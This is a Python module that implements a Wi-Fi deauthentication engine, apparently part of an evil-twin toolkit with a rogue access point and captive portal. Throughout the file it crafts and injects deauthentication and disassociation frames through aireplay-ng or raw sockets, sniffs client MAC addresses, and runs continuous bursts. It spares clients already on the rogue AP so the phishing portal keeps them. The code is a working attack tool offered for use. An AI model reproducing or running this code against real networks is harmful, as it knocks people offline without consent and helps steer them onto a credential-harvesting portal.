"""Deauth engine: aireplay-ng with raw 802.11 fallback.

On the old Pager this went through `_pineap DEAUTH`; on Linux it uses a
monitor-mode virtual interface and either aireplay-ng or direct AF_PACKET
frame injection. Injection is best-effort — drivers built for AP-only (no
packet injection) will log ALERTs and keep trying.
"""

import os
import re
import socket
import struct
import subprocess
import threading
import time

from . import config
from . import linuxutil
from . import state

AIRPLAY = '/usr/sbin/aireplay-ng'


class DeauthEngine(object):
    def __init__(self):
        self._stop = threading.Event()
        self._thread = None
        self._cfg = None
        self._sock = None
        self._sock_iface = None
        self._seq = 0
        self._air_fails = 0
        self._mon = None
        self._known_devices = set()
        self._continuous = True
        self._no_bssid_warned = False
        self._rogue_ap = None
        self._rogue_channel = None
        self._degraded_warned = False
        self._no_inject_warned = False
        self._last_chan = {}

    # --- monitor -----------------------------------------------------------------
    def _monitor(self):
        """Resolve monitor vif, caching only a usable result.

        Retries every call while None: a radio may only free up (stop being an
        internet uplink) after the chain is armed.
        """
        if self._mon:
            return self._mon
        mon = linuxutil.ensure_monitor_iface()
        if mon:
            self._mon = mon
        return mon

    # --- injection primitives ------------------------------------------------------
    def _set_mon_channel(self, mon, channel):
        """Tune the monitor vif, skipping redundant calls.

        Repeated `iw dev X set channel` on cheap USB dongles (rtl8xxxu etc.)
        stalls the driver for hundreds of ms each — same path that wedged the
        radio stack mid-attack. Only toggle the channel when it actually moved.
        """
        channel = str(channel)
        if self._last_chan.get(mon) == channel:
            return
        if linuxutil.set_channel(mon, channel):
            self._last_chan[mon] = channel

    def _send_aireplay(self, ap, client, channel, count):
        mon = self._monitor()
        if not mon or not os.path.exists(AIRPLAY):
            return False
        if channel:
            self._set_mon_channel(mon, channel)
        argv = [AIRPLAY, '-0', str(count), '-a', ap]
        if client and client != 'FF:FF:FF:FF:FF:FF':
            argv += ['-c', client]
        argv.append(mon)
        try:
            r = subprocess.run(argv, capture_output=True, text=True, timeout=20)
            return r.returncode == 0
        except (OSError, subprocess.TimeoutExpired):
            return False

    def _raw_socket(self):
        mon = self._monitor()
        if not mon:
            return None
        if self._sock and self._sock_iface == mon:
            return self._sock
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.htons(0x0003))
            sock.bind((mon, 0))
            self._sock = sock
            self._sock_iface = mon
            return sock
        except OSError:
            return None

    def _send_raw(self, ap, client, channel, count=1, disassoc=False):
        sock = self._raw_socket()
        if not sock:
            return False
        if channel:
            self._set_mon_channel(self._sock_iface, channel)
        try:
            dst = bytes.fromhex(client.replace(':', ''))
            src = bytes.fromhex(ap.replace(':', ''))
            if len(dst) != 6 or len(src) != 6:
                return False
        except ValueError:
            return False
        # Deauthentication (0x00C0) and disassociation (0x00A0) share the
        # frame body; a fair share of client stacks quietly ignore deauth
        # but do honor disassociation — send both kinds.
        fc = struct.pack('<H', 0x00A0 if disassoc else 0x00C0)
        dur = struct.pack('<H', 0x0000)
        reason = struct.pack('<H', 0x0007)
        sent = 0
        for _ in range(max(1, int(count or 1))):
            if self._stop.is_set():
                return sent > 0
            self._seq = (self._seq + 1) & 0x0FFF
            seq = struct.pack('<H', self._seq << 4)
            try:
                sock.send(fc + dur + dst + src + src + seq + reason)
                sent += 1
            except OSError:
                return sent > 0
        return True

    def _disassoc(self, ap, client, channel, count):
        """Raw disassociation follow-up (no aireplay-ng mode exists for it)."""
        return self._send_raw(ap, client, channel, count, disassoc=True)

    def _frame(self, ap, client, channel, count):
        if config.DEAUTH_METHOD != 'raw' and self._air_fails < 3:
            if self._send_aireplay(ap, client, channel, count):
                return True
            self._air_fails += 1
        return self._send_raw(ap, client, channel, count)

    # --- passive client pickup (targeted / adaptive) ----------------------------------
    def collect_clients(self, ap, channel, seconds=None):
        seconds = seconds or config.CLIENT_WINDOW
        mon = self._monitor()
        if not mon:
            return []
        if channel:
            self._set_mon_channel(mon, channel)
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                 socket.htons(0x0003))
            sock.bind((mon, 0))
            sock.settimeout(1)
        except OSError:
            return []
        apb = bytes.fromhex(ap.replace(':', ''))
        bcast = b'\xff' * 6
        seen = set()
        deadline = time.time() + seconds
        while time.time() < deadline:
            try:
                data = sock.recv(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                if len(data) < 4:
                    continue
                rt_len = struct.unpack('<H', data[2:4])[0]
                if rt_len < 4 or rt_len > len(data) - 10:
                    continue
                body = data[rt_len:]
                if len(body) < 24:
                    continue
                addr2 = body[10:16]
                if addr2 in (apb, bcast) or addr2[0] & 0x01:
                    continue
                seen.add(':'.join('%02x' % b for b in addr2).upper())
            except (struct.error, ValueError, IndexError):
                continue
        sock.close()
        return list(seen)

    # --- targeted logic ----------------------------------------------------------------
    def set_rogue(self, ap_iface, channel=None):
        """Tell the engine which interface currently serves the rogue AP.

        The deauth loop uses this to never broadcast-deauth on the rogue AP's
        own channel (that would sever its own clients — exactly the "the AP
        broadcasts but nothing ever connects" symptom) and to skip clients
        already sitting on the rogue AP.
        """
        self._rogue_ap = ap_iface if ap_iface else None
        self._rogue_channel = str(channel) if channel not in (None, '') else None
        self._degraded_warned = False

    def _rogue_stations(self):
        if not self._rogue_ap:
            return set()
        return linuxutil.station_clients(self._rogue_ap)

    def _rogue_on_channel(self, st):
        return (bool(self._rogue_ap) and self._rogue_channel
                and str(st.get('target_channel', '6')) == str(self._rogue_channel))

    def _warn_degraded(self):
        if self._degraded_warned:
            return
        self._degraded_warned = True
        state.emit('DEAUTH',
                   'broadcast deauth suppressed — rogue AP shares this channel, '
                   'switched to targeted per-client (portal stays up)')

    def _targets(self, st):
        ap = st.get('target_bssid')
        ch = st.get('target_channel', '6')
        mode = st.get('deauth_mode', 'broadcast')
        if mode == 'off':
            return None, []
        shield = bool(st.get('shield_after_capture', False))
        mac_shields = state.read_shield_macs()
        any_shield = bool(mac_shields) or (shield and bool(state.read_whitelist()))
        rogue_same = self._rogue_on_channel(st)
        rogue_stas = self._rogue_stations() if self._rogue_ap else set()

        def pick(clients):
            out = []
            for c in clients:
                up = c.upper()
                if up in mac_shields:
                    continue
                if rogue_stas and up in rogue_stas:
                    continue
                if up not in self._known_devices:
                    self._known_devices.add(up)
                    state.upsert_device(c)
                out.append((up, ch))
            return out

        if mode in ('targeted', 'adaptive'):
            clients = pick(self.collect_clients(ap, ch))
            if not clients and mode == 'adaptive':
                return mode, []
            return mode, clients
        # broadcast-style (default). A broadcast deauthentication frame spams
        # the whole channel and does not discriminate — with the rogue AP live
        # on that channel it also flattens the portal's own clients, so it is
        # only used when the attack cannot hit our own AP.
        if not any_shield and not rogue_same:
            return None, [('FF:FF:FF:FF:FF:FF', ch)]
        if rogue_same:
            self._warn_degraded()
            clients = pick(self.collect_clients(ap, ch))[:24]
            return None, clients
        # shields exist but rogue not on this channel: protect shielded MACs
        # with a per-client burst too (a broad deauth would hit operator gear).
        clients = pick(self.collect_clients(ap, ch))[:24]
        return None, clients

    def _warn_no_injection(self):
        """Honest failure: no deauth frame actually left the box."""
        if self._no_inject_warned:
            return
        self._no_inject_warned = True
        state.emit('ALERT',
                   'deauth inactive: no frame left the box — monitor vif '
                   'unavailable or aireplay-ng/raw injection both failing '
                   '(portal + capture keep running)')

    def _burst(self, st):
        ap = (st.get('target_bssid') or '').strip()
        if not ap:
            if st.get('deauth_mode', 'broadcast') != 'off' \
                    and not getattr(self, '_no_bssid_warned', False):
                self._no_bssid_warned = True
                state.emit('ALERT', 'deauth disabled: no target BSSID set — '
                                   'portal + capture still armed')
            return
        count = max(1, int(st.get('deauth_burst', 25) or 25))
        mode, targets = self._targets(st)
        if not targets:
            return
        method = 'raw'
        sent_any = False
        sent_dis = 0
        for (client, ch) in targets:
            if self._stop.is_set():
                return
            if self._frame(ap, client, ch, count):
                sent_any = True
                method = 'aireplay' if (config.DEAUTH_METHOD != 'raw'
                                         and self._air_fails < 3) else 'raw'
            if self._disassoc(ap, client, ch, count):
                sent_dis += 1
        if not sent_any and not sent_dis:
            # Never report a burst that didn't happen — the operator would
            # watch the event log believing the target is being cleared while
            # nothing was transmitted at all.
            self._warn_no_injection()
            return
        frames = count * (len(targets) + sent_dis)
        state.emit('DEAUTH', '%s deauth burst (%d frames%s) on %s ch%s via %s (%d targets)' % (
            st.get('deauth_mode', '?'), frames,
            ' deauth+disassoc' if sent_dis else '', ap,
            st.get('target_channel', '?'),
            method if len(targets) == 1 else 'multi', len(targets)))

    def _worker(self, st):
        while not self._stop.is_set():
            if self._continuous:
                try:
                    self._burst(st)
                except Exception as exc:  # keep the loop alive on bad state
                    state.emit('ALERT', 'deauth burst failed: %s' % exc)
            delay = max(0.2, float(st.get('deauth_delay', 1) or 1))
            self._stop.wait(delay)

    # --- lifecycle ---------------------------------------------------------------------
    def start(self, st):
        self._continuous = bool(st.get('deauth_continuous', True))
        self._stop.clear()
        self._no_bssid_warned = False
        self._no_inject_warned = False
        self._thread = threading.Thread(target=self._worker, args=(st,), daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
            self._air_fails = 0
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None
            self._sock_iface = None